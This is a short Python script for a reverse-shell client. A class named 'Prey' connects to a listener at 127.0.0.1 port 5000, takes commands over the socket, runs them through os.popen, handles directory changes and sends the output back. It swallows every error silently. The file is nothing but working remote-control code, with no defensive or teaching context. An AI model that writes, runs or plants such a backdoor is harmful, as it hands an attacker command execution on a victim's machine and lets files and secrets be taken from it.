#-*-coding: utf-8-*-
from socket import *
from os import popen, getcwd, chdir

class Prey:
	def __init__(self, host, port):
		self.sock = socket(AF_INET, SOCK_STREAM)
		self.sock.connect((host, port))
	def shell(self):
		cmd = ""
		while cmd != "exit":
			try:
				cmd = self.sock.recv(1024)
				cmd = cmd.decode()
				if cmd[:2] == "cd":
					chdir(cmd[3:])
				out = popen(cmd).read()
				self.sock.send("{}\n{}".format(getcwd(), out).encode())
			except: 
				pass
		exit()
def main():
	c = Prey("127.0.0.1", 5000)
	c.shell()
if __name__ == '__main__':
	main()

